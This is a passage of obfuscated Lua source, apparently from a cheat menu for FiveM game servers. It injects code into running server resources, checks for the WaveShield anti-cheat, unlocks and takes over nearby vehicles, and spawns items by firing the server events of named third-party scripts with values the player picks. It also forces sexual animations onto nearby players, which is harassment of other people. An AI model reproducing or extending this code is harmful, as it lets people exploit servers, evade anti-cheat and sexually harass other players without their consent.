                ]]):format(v218);MachoInjectResource((v47("monitor") and "monitor") or "any" ,v221);break;end end end break;end if (v217==(2 -1)) then v220=GetResourceState("lb-phone")=="started" ;v221=nil;v217=2;end if (v217==(602 -(512 + 90))) then v218=MachoMenuGetInputbox(v61);v219=GetResourceState("WaveShield")=="started" ;v217=1907 -(1665 + 241) ;end end end);MachoMenuButton(v42[720 -(373 + 344) ],"Repair Vehicle",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function FgN7LqxZyP()
                    local aBcD = PlayerPedId
                    local eFgH = GetVehiclePedIsIn
                    local iJkL = SetVehicleFixed
                    local mNoP = SetVehicleDeformationFixed

                    local p = aBcD()
                    local v = eFgH(p, false)
                    if v and v ~= 0 then
                        iJkL(v)
                        mNoP(v)
                    end
                end

                FgN7LqxZyP()
            ]]);end);MachoMenuButton(v42[2 + 1 ],"Flip Vehicle",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function vXmYLT9pq2()
                    local a = PlayerPedId
                    local b = GetVehiclePedIsIn
                    local c = GetEntityHeading
                    local d = SetEntityRotation

                    local ped = a()
                    local veh = b(ped, false)
                    if veh and veh ~= 0 then
                        d(veh, 0.0, 0.0, c(veh))
                    end
                end

                vXmYLT9pq2()
            ]]);end);MachoMenuButton(v42[1 + 2 ],"Clean Vehicle",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function qPwRYKz7mL()
                    local a = PlayerPedId
                    local b = GetVehiclePedIsIn
                    local c = SetVehicleDirtLevel

                    local ped = a()
                    local veh = b(ped, false)
                    if veh and veh ~= 0 then
                        c(veh, 0.0)
                    end
                end

                qPwRYKz7mL()
            ]]);end);MachoMenuButton(v42[7 -4 ],"Delete Vehicle",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function LXpTqWvR80()
                    local aQw = PlayerPedId
                    local bEr = GetVehiclePedIsIn
                    local cTy = DoesEntityExist
                    local dUi = NetworkHasControlOfEntity
                    local eOp = SetEntityAsMissionEntity
                    local fAs = DeleteEntity
                    local gDf = DeleteVehicle
                    local hJk = SetVehicleHasBeenOwnedByPlayer

                    local ped = aQw()
                    local veh = bEr(ped, false)

                    if veh and veh ~= 0 and cTy(veh) then
                        hJk(veh, true)
                        eOp(veh, true, true)

                        if dUi(veh) then
                            fAs(veh)
                            gDf(veh)
                        end
                    end

                end

                LXpTqWvR80()
            ]]);end);MachoMenuButton(v42[4 -1 ],"Toggle Vehicle Engine",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function NKzqVoXYLm()
                    local a = PlayerPedId
                    local b = GetVehiclePedIsIn
                    local c = GetIsVehicleEngineRunning
                    local d = SetVehicleEngineOn

                    local ped = a()
                    local veh = b(ped, false)
                    if veh and veh ~= 0 then
                        if c(veh) then
                            d(veh, false, true, true)
                        else
                            d(veh, true, true, false)
                        end
                    end
                end

                NKzqVoXYLm()
            ]]);end);MachoMenuButton(v42[1102 -(35 + 1064) ],"Max Vehicle Upgrades",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function XzPmLqRnWyBtVkGhQe()
                    local FnUhIpOyLkTrEzSd = PlayerPedId
                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                    local QwErTyUiOpAsDfGh = SetVehicleMod
                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                    for XyZoPqRtWnEsDfGh = 0, 16 do
                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                        end
                    end

                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                    end

                    for QeTrBnMkOjHuYgFv = 17, 22 do
                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                    end

                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                    for TpYuIoPlMnBvCxZq = 1, 12 do
                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                        end
                    end

                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                end

                XzPmLqRnWyBtVkGhQe()
            ]]);end);MachoMenuButton(v42[3 + 0 ],"Teleport into Closest Vehicle",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function uPKcoBaEHmnK()
                    local ziCFzHyzxaLX = SetPedIntoVehicle
                    local YPPvDlOGBghA = GetClosestVehicle

                    local Coords = GetEntityCoords(PlayerPedId())
                    local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                    if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                        if GetPedInVehicleSeat(vehicle, -1) == 0 then
                            ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                        else
                            ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                        end
                    end
                end

                uPKcoBaEHmnK()
            ]]);end);MachoMenuButton(v42[3],"Unlock Closest Vehicle",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function TpLMqKtXwZ()
                    local AsoYuTrBnMvCxZaQw = PlayerPedId
                    local GhrTnLpKjUyVbMnZx = GetEntityCoords
                    local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                    local ZmkLpQwErTyUiOpAs = DoesEntityExist
                    local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                    local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                    local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                    local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                    local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                    local ped = AsoYuTrBnMvCxZaQw()
                    local coords = GhrTnLpKjUyVbMnZx(ped)
                    local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                    if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                        VczNmLoJhBgVfCdEx(veh, true, true)
                        RtYuIoPlMnBvCxZaSd(veh, true)
                        EqWoXyBkVsNzQuH(veh, 1)
                        YxZwQvTrBnMaSdFgHj(veh, false)
                    end

                end

                TpLMqKtXwZ()
            ]]);end);MachoMenuButton(v42[6 -3 ],"Lock Closest Vehicle",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function tRYpZvKLxQ()
                    local WqEoXyBkVsNzQuH = PlayerPedId
                    local LoKjBtWxFhPoZuR = GetEntityCoords
                    local VbNmAsDfGhJkLzXcVb = GetClosestVehicle
                    local TyUiOpAsDfGhJkLzXc = DoesEntityExist
                    local PlMnBvCxZaSdFgTrEq = SetEntityAsMissionEntity
                    local KjBtWxFhPoZuRZlK = SetVehicleHasBeenOwnedByPlayer
                    local AsDfGhJkLzXcVbNmQwE = SetVehicleDoorsLocked
                    local QwEoXyBkVsNzQuHL = SetVehicleDoorsLockedForAllPlayers
                    local ZxCvBnMaSdFgTrEqWz = NetworkHasControlOfEntity

                    local ped = WqEoXyBkVsNzQuH()
                    local coords = LoKjBtWxFhPoZuR(ped)
                    local veh = VbNmAsDfGhJkLzXcVb(coords.x, coords.y, coords.z, 10.0, 0, 70)

                    if veh and TyUiOpAsDfGhJkLzXc(veh) and ZxCvBnMaSdFgTrEqWz(veh) then
                        PlMnBvCxZaSdFgTrEq(veh, true, true)
                        KjBtWxFhPoZuRZlK(veh, true)
                        AsDfGhJkLzXcVbNmQwE(veh, 2)
                        QwEoXyBkVsNzQuHL(veh, true)
                    end
                end

                tRYpZvKLxQ()
            ]]);end);MachoMenuButton(v43[1 + 0 ],"Force Emotes [Be careful]",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                Citizen.CreateThread(function()
            local playerPed = PlayerPedId()
            local playerId = GetPlayerServerId(PlayerId())

            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        end)
            ]]);end);MachoMenuButton(v43[1237 -(298 + 938) ],"Detach All Entitys",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function zXqLJWt7pN()
                    local xPvA71LtqzW = ClearPedTasks
                    local bXcT2mpqR9f = DetachEntity

                    xPvA71LtqzW(PlayerPedId())
                    bXcT2mpqR9f(PlayerPedId())
                end

                zXqLJWt7pN()
            ]]);end);MachoMenuButton(v43[1],"Twerk On Them",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function OyWTpKvmXq()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)
                    
                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)
                            
                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if StarkDaddy then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            StarkDaddy = false
                        else
                            StarkDaddy = true
                            if not HasAnimDictLoaded("switch@trevor@mocks_lapdance") then
                                RequestAnimDict("switch@trevor@mocks_lapdance")
                                while not HasAnimDictLoaded("switch@trevor@mocks_lapdance") do
                                    Wait(0)
                                end        
                            end

                            local targetPed = GetPlayerPed(closestPlayer)
                            AttachEntityToEntity(playerPed, targetPed, 4103, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                            TaskPlayAnim(playerPed, "switch@trevor@mocks_lapdance", "001443_01_trvs_28_idle_stripper", 8.0, -8.0, 100000, 33, 0, false, false, false)
                        end
                    end
                end

                OyWTpKvmXq()
            ]]);end);MachoMenuButton(v43[1260 -(233 + 1026) ],"Give Them Backshots",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function bXzLqPTMn9()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if StarkDaddy then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            StarkDaddy = false
                        else
                            StarkDaddy = true
                            if not HasAnimDictLoaded("rcmpaparazzo_2") then
                                RequestAnimDict("rcmpaparazzo_2")
                                while not HasAnimDictLoaded("rcmpaparazzo_2") do
                                    Wait(0)
                                end
                            end

                            local targetPed = GetPlayerPed(closestPlayer)
                            AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                            TaskPlayAnim(PlayerPedId(), "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, 100000, 33, 0, false, false, false)
                            TaskPlayAnim(GetPlayerPed(closestPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                        end
                    end
                end

                bXzLqPTMn9()
            ]]);end);MachoMenuButton(v43[1667 -(636 + 1030) ],"Wank On Them",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function qXW7YpLtKv()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if isInPiggyBack then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            wankoffperson = false
                        else
                            wankoffperson = true
                            if not HasAnimDictLoaded("mp_player_int_upperwank") then
                                RequestAnimDict("mp_player_int_upperwank")
                                while not HasAnimDictLoaded("mp_player_int_upperwank") do
                                    Wait(0)
                                end
                            end
                        end

                        TaskPlayAnim(PlayerPedId(), "mp_player_int_upperwank", "mp_player_int_wank_01", 8.0, -8.0, -1, 51, 1.0, false, false, false)
                    end
                end

                qXW7YpLtKv()
            ]]);end);MachoMenuButton(v43[1 + 0 ],"Piggyback On Player",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function RtKpqLmXZV()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if isInPiggyBack then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            isInPiggyBack = false
                        else
                            isInPiggyBack = true
                            if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
                                RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
                                while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                                    Wait(0)
                                end
                            end

                            local targetPed = GetPlayerPed(closestPlayer)
                            AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false, false, false, false, 2, false)
                            TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                        end
                    end
                end

                RtKpqLmXZV()
            ]]);end);MachoMenuButton(v43[1 + 0 ],"Blame Arrest",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function WXY7LpqKto()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if StarkCuff then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            StarkCuff = false
                        else
                            StarkCuff = true
                            if not HasAnimDictLoaded("mp_arresting") then
                                RequestAnimDict("mp_arresting")
                                while not HasAnimDictLoaded("mp_arresting") do
                                    Wait(0)
                                end
                            end

                            local targetPed = GetPlayerPed(closestPlayer)
                            AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.35, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                            TaskPlayAnim(PlayerPedId(), "mp_arresting", "idle", 8.0, -8, -1, 49, 0.0, false, false, false)
                        end
                    end
                end

                WXY7LpqKto()
            ]]);end);MachoMenuButton(v43[1 + 0 ],"Blame Carry",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function KmXYpTzqLW()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if StarkCarry then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            StarkCarry = false
                        else
                            StarkCarry = true
                            if not HasAnimDictLoaded("nm") then
                                RequestAnimDict("nm")
                                while not HasAnimDictLoaded("nm") do
                                    Wait(0)
                                end
                            end

                            local targetPed = GetPlayerPed(closestPlayer)
                            AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                            TaskPlayAnim(PlayerPedId(), "nm", "firemans_carry", 8.0, -8.0, 100000, 33, 0, false, false, false)
                        end
                    end
                end

                KmXYpTzqLW()
            ]]);end);MachoMenuButton(v43[1 + 0 ],"Sit On Them",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function PxKvqLtNYz()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") then
                        RequestAnimDict("anim@heists@prison_heistunfinished_biztarget_idle")
                        while not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") do
                            Wait(0)
                        end
                    end

                    AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 4103, 0.10, 0.28, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                    TaskPlayAnim(PlayerPedId(), "anim@heists@prison_heistunfinished_biztarget_idle", "target_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
                    TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
                end

                PxKvqLtNYz()
            ]]);end);MachoMenuButton(v43[222 -(55 + 166) ],"Ride Driver",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function vZqPWLXm97()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if RideDriver then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            RideDriver = false
                        else
                            RideDriver = true
                            if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                                RequestAnimDict("mini@prostitutes@sexnorm_veh")
                                while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                                    Wait(0)
                                end
                            end

                            local targetPed = GetPlayerPed(closestPlayer)
                            AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                            TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "sex_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                        end
                    end
                end

                vZqPWLXm97()
            ]]);end);MachoMenuButton(v43[1 + 0 ],"Blow Driver",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function qPLWtXYzKm()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if BlowDriver then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            BlowDriver = false
                        else
                            BlowDriver = true
                            if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                                RequestAnimDict("mini@prostitutes@sexnorm_veh")
                                while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                                    Wait(0)
                                end
                            end

                            TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "bj_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                        end
                    end
                end

                qPLWtXYzKm()
            ]]);end);MachoMenuButton(v43[1 + 0 ],"Meditate On Them",function() MachoInjectResource((v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                local function XYqLvTzWKo()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if not HasAnimDictLoaded("rcmcollect_paperleadinout@") then
                        RequestAnimDict("rcmcollect_paperleadinout@")
                        while not HasAnimDictLoaded("rcmcollect_paperleadinout@") do
                            Wait(0)
                        end
                    end

                    AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 57005, 0, -0.12, 1.53, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                    TaskPlayAnim(PlayerPedId(), "rcmcollect_paperleadinout", "meditiate_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
                    TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
                end

                XYqLvTzWKo()
            ]]);end);local v62=0 -0 ;local v63=false;local v64=nil;local v65={[297 -(36 + 261) ]="slapped",[1 -0 ]="punched",[2]="receiveblowjob",[1371 -(34 + 1334) ]="GiveBlowjob",[2 + 2 ]="headbutted",[5]="hug4",[5 + 1 ]="streetsexfemale",[1290 -(1035 + 248) ]="streetsexmale",[29 -(20 + 1) ]="pback2",[9]="carry3",[6 + 4 ]=".....gta298",[11]=".....gta304",[12]=".....gta284"};MachoMenuDropDown(v43[321 -(134 + 185) ],"Emote Choice",function(v222) v62=v222;end,"Slapped","Punched","Give BJ","Recieve BJ","Headbutt","Hug","StreetSexFemale","StreetSexMale","Piggyback","Carry","Butt Rape","Amazing Head","Lesbian Scissors");MachoMenuButton(v43[1135 -(549 + 584) ],"Give Emote",function() local v223=0;local v224;while true do if (v223==0) then v224=v65[v62];if v224 then MachoInjectResource2(688 -(314 + 371) ,(v47("monitor") and "monitor") or "any" ,string.format([[
                    local function KmTpqXYzLv()
                        local Rk3uVnTZpxf7Q = TriggerEvent
                        Rk3uVnTZpxf7Q("ClientEmoteRequestReceive", "%s", true)
                    end

                    KmTpqXYzLv()
                ]],v224));end break;end end end);InputBoxHandle=MachoMenuInputbox(v44[1],"Name:","...");InputBoxHandle2=MachoMenuInputbox(v44[3 -2 ],"Amount:","...");MachoMenuButton(v44[969 -(478 + 490) ],"Spawn",function() local v225=0 + 0 ;local v226;local v227;while true do if ((1172 -(786 + 386))==v225) then v226=MachoMenuGetInputbox(InputBoxHandle);v227=MachoMenuGetInputbox(InputBoxHandle2);v225=3 -2 ;end if (v225==(1380 -(1055 + 324))) then if (v226 and (v226~="") and v227 and tonumber(v227)) then local v360=tonumber(v227);local v361={ak47_drugmanager=function() MachoInjectResource2(1343 -(1093 + 247) ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function efjwr8sfr()
                                TriggerServerEvent('ak47_drugmanager:pickedupitem', "]]   .. v226   .. [[", "]]   .. v226   .. [[", ]]   .. v227   .. [[)
                            end

                            efjwr8sfr()
                        ]] );end,["bobi-selldrugs"]=function() MachoInjectResource2(3 + 0 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function safdagwawe()
                                TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "]]   .. v226   .. [[", ]]   .. v227   .. [[)
                            end

                            safdagwawe()
                        ]] );end,["mc9-taco"]=function() MachoInjectResource2(1 + 2 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function cesfw33w245d()
                                TriggerServerEvent('mc9-taco:server:addItem', "]]   .. v226   .. [[", ]]   .. v227   .. [[)
                            end

                            cesfw33w245d()
                        ]] );end,["bobi-selldrugs"]=function() MachoInjectResource2(11 -8 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function safdagwawe()
                                TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "]]   .. v226   .. [[", ]]   .. v227   .. [[)
                            end

                            safdagwawe()
                        ]] );end,["wp-pocketbikes"]=function() MachoInjectResource2(3,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function awdfaweawewaeawe()
                                TriggerServerEvent("wp-pocketbikes:server:AddItem", "]]   .. v226   .. [[", ]]   .. v227   .. [[)
                            end

                            awdfaweawewaeawe()
                        ]] );end,["solos-jointroll"]=function() MachoInjectResource2(9 -6 ,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                            local function weawasfawfasfa()
                                TriggerServerEvent('solos-joints:server:itemadd', "]]   .. v226   .. [[", ]]   .. v227   .. [[)
                            end

                            weawasfawfasfa()
